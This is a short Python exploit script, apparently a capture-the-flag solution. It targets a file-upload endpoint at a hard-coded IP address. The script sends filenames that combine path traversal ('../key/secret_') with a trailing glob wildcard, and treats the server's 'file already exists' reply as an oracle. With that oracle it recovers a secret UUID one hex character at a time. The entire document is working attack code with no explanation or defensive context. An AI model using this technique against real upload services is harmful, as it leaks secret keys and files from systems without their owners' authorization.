import requests
import sys

startingPoint = ""
if len(sys.argv) == 2:
    startingPoint = sys.argv[1]

REMOTE = "http://13.58.101.77:8888"

HEX_CHARS = "0123456789abcdef"

def make_glob_request(prefix):
    data = {
        'filename': prefix,
        'content': 'abc'
    }
    r = requests.post(f"{REMOTE}/upload", data=data)
    return "file already exists..." in r.text

UUID_LENGTH = 36
STATIC_PREFIX = "../key/secret_"

def brute_glob_requests():
    known_string = startingPoint

    while len(known_string) < 36:
        if len(known_string) in [8,13,18,23]:
            known_string += "-"
        print("\nKnown string: {}".format(known_string))
        for hex_char in HEX_CHARS:
            print(".", end="")
            if make_glob_request(STATIC_PREFIX + known_string + hex_char + "*"):
                known_string += hex_char
                break;
    
    print("\nDone!\nFinal known string: {}".format(known_string))

brute_glob_requests()
